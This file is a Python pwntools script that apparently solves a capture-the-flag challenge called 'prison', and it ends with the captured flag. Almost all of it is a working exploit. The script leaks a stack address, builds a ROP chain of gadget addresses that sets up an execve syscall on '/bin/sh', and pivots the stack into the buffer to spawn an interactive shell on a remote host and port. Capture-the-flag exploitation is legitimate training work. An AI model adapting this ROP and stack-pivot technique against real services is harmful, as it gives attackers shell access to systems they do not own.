#!/usr/bin/python3
from pwn import *

context.log_level = "critical"
context.terminal = ["remotinator", "vsplit", "-x"]

exe = context.binary = ELF("/home/kali/Desktop/prison")
# libc = exe.libc

def start(*pargs, **kwargs):
    if args.REMOTE:
        return remote("20.84.72.194", 5001)
    if args.GDB:
        return exe.debug(gdbscript="b*0x401b55\ncontinue", *pargs, **kwargs)
    return exe.process(*pargs, **kwargs)

io = start()

####### BEGIN #######

io.sendlineafter(b": ", b"17")

stack_leak = u64(io.recvline()[27:-1].ljust(8, b"\x00"))

print("[*] stack leak @ %s" % hex(stack_leak))

rsp = stack_leak - 168
buffer = rsp - 0x48

print("[*] buffer @ %s" % hex(buffer))

payload = p64(0x41f464) # pop rax ; ret
payload += p64(59)
payload += p64(0x401a0d) # pop rdi ; ret
payload += p64(rsp + 16)
payload += p64(0x413676) # pop rsi ; pop rbp ; ret
payload += p64(0) * 2

payload += p64(0x4013b8) # syscall

payload += b"\x00" * (0x48 - len(payload)) # padding
# It was probably intended to put the binsh at the beginning
# of the buffer, therefore I am using only 64 out of the 72 characters possible ;)

payload += p64(0x4450f8) # pop rsp ; ret
payload += p64(buffer)
payload += b'/bin/sh\x00' # rsp + 16

io.sendlineafter(b": ", payload)

io.recvuntil(b"rest.\n")

io.interactive()

# squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}